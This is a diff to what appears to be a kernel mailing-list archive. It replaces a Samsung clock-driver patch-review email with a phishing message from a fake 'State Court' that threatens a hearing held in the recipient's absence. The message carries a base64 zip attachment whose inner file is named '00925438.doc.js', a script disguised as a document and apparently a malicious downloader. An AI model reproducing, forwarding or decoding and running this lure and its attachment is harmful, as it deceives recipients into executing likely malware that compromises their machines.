@@ -1,72 +1,107 @@
-From: Krzysztof Kozlowski <k.kozlowski@samsung.com>
-Subject: Re: [PATCH 01/11] clk: samsung: exynos7: Change the CMU_TOPC block
- clock name
-Date: Mon, 07 Sep 2015 16:39:46 +0900
-Message-ID: <55ED3F42.6040703@samsung.com>
-References: <1441366637-28001-1-git-send-email-alim.akhtar@samsung.com>
- <1441366637-28001-2-git-send-email-alim.akhtar@samsung.com>
- <55ED21B7.6080608@samsung.com> <55ED3C43.4000408@samsung.com>
+From: "State Court" <pedro.gray@kundenserver.de>
+Subject: Notice to Appear
+Date: Mon, 7 Sep 2015 09:59:32 +0200
+Message-ID: <197faed5aabf4f7b2d0cc63250f94388@kundenserver.de>
+Reply-To: "State Court" <pedro.gray@kundenserver.de>
 Mime-Version: 1.0
-Content-Type: text/plain; charset=windows-1252
-Content-Transfer-Encoding: 7bit
+Content-Type: multipart/mixed;
+	boundary="b1_61531026dde8de873ac7354d2bd786d3"
+Content-Transfer-Encoding: 8bit
 Return-path: <linux-samsung-soc-owner@vger.kernel.org>
-Received: from mailout2.w1.samsung.com ([210.118.77.12]:49375 "EHLO
-	mailout2.w1.samsung.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-	with ESMTP id S1751224AbbIGHjz (ORCPT
+Received: from mout.kundenserver.de ([212.227.126.187]:50229 "EHLO
+	mout.kundenserver.de" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
+	with ESMTP id S1752063AbbIGH7f (ORCPT
 	<rfc822;linux-samsung-soc@vger.kernel.org>);
-	Mon, 7 Sep 2015 03:39:55 -0400
-In-reply-to: <55ED3C43.4000408@samsung.com>
+	Mon, 7 Sep 2015 03:59:35 -0400
 Sender: linux-samsung-soc-owner@vger.kernel.org
 List-Id: linux-samsung-soc@vger.kernel.org
-To: Alim Akhtar <alim.akhtar@samsung.com>, linux-samsung-soc@vger.kernel.org
-Cc: s.nawrocki@samsung.com, tomasz.figa@gmail.com, kgene@kernel.org, mturquette@baylibre.com, amit.daniel@samsung.com, gautam.vivek@samsung.com, sboyd@codeaurora.org, linux-clk@vger.kernel.org
+To: linux-samsung-soc@vger.kernel.org
 
-On 07.09.2015 16:26, Alim Akhtar wrote:
-> Hi Krzysztof,
-> 
-> On 09/07/2015 11:03 AM, Krzysztof Kozlowski wrote:
->> On 04.09.2015 20:37, Alim Akhtar wrote:
->>> Corrects the CMU_TOPC block clock name as per user manual.
->>> This also adds few of the missing gate clocks of topc block.
->>> This does not change any functionalies.
->>
->> s/functionalies/functionalities/
->>
->> Yes, it does change. After adding new gates without users, kernel will
->> disable them. Previously these gates remained in default reset state
->> (probably "pass") or in state set by bootloader (also "pass").
->>
-> My bad, was not enough clear of that, what I mean is these changes does
-> not affect the working of the related IPs, yes it does change the status
-> of gate clocks.
-> Will update the commit log.
-> 
->> Please update the changelog and of course test the patchset for any
->> issues in different components depending on these clocks. Depending
->> directly or indirectly.
->>
->> Split the patch into:
->> 1. clean up/rename,
->> 2. addition of new mux/gate clock.
->>
-> This patch adds few of the gate clocks, the reason I added it here
-> because subsequent patches in this series can use it.
-> Or may I should move these new addition to the patch 02/11, as 02/11 is
-> going to use them.
-> Do you think that make sense to you?
+--b1_61531026dde8de873ac7354d2bd786d3
+Content-Type: text/plain; charset=us-ascii
 
->From the reviewer point of view I would prefer to separate renaming from
-addition. You can rename the CMU_TOPC in patch #1, add new gates in #2
-and continue with the work (more renames).
+Notice to Appear,
 
-> 
->> Currently it is more difficult to review the patch.
->>
-> Thanks for your time, do you have any comments of the other patches in
-> this series?
+You have to appear in the Court on the September 15.
+Please, do not forget to bring all the documents related to the case.
+Note: If you do not come, the case will be heard in your absence.
 
-Not yet. I'll look at them in few days. So it's up to you if you want to
-send next version now or wait for my further comments.
+You can review complete details of the Court Notice in the attachment.
 
-Best regards,
-Krzysztof
+Yours faithfully,
+Pedro Gray,
+Clerk of Court.
+
+
+--b1_61531026dde8de873ac7354d2bd786d3
+Content-Type: application/zip; name="00925438.zip"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename=00925438.zip
+
+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
+BgAAAAABAAEAPQAAAMcNAAAAAA==
+
+
+--b1_61531026dde8de873ac7354d2bd786d3--
